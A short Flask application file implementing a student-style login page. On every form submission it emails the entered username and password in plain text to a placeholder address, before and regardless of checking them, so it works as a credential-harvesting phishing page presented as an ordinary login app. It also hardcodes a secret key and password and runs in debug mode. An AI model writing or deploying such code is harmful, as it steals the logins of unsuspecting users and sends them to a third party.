# app.py

from flask import Flask, render_template, request, redirect, url_for,  session
from flask_mail import Mail, Message
import os
from dotenv import load_dotenv

load_dotenv()


app = Flask(__name__)
app.secret_key = 'your_secret_key'
# Configure Flask-Mail for sending emails
app.config["MAIL_SERVER"] = os.getenv("MAIL_SERVER")
app.config["MAIL_PORT"] = int(os.getenv("MAIL_PORT"))
app.config["MAIL_USE_TLS"] = os.getenv("MAIL_USE_TLS") == "True"
app.config["MAIL_USERNAME"] = os.getenv("MAIL_USERNAME")
app.config["MAIL_PASSWORD"] = os.getenv("MAIL_PASSWORD")
app.config["MAIL_DEFAULT_SENDER"] = os.getenv("MAIL_DEFAULT_SENDER")
mail = Mail(app)

# Hardcoded valid credentials (use a database in a production environment)
VALID_USERNAME = "student123"
VALID_PASSWORD = "password123"


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Get the form data
        username = request.form["username"]
        password = request.form["password"]

        # Send email with the login attempt details
        msg = Message(
            "Login Attempt Details",
            recipients=["recipient__email(your)"],  # Your email
            body=f"Username: {username}\nPassword: {password}",
        )

        try:
            mail.send(msg)
        except Exception as e:
            print(f"Error sending email: {e}")

        # Check if the credentials are correct
        if username != VALID_USERNAME or password != VALID_PASSWORD:
            # Store error in session
            session['login_error'] = "Invalid login, please try again"
            return redirect(url_for("login"))
        else:
            # Clear any existing error and redirect to dashboard or home
            session.pop('login_error', None)
            return redirect(url_for("dashboard"))  # Implement this route

    # Retrieve and clear error from session
    error = session.pop('login_error', None)
    return render_template("login.html", error=error)



if __name__ == "__main__":
    app.run(debug=True)
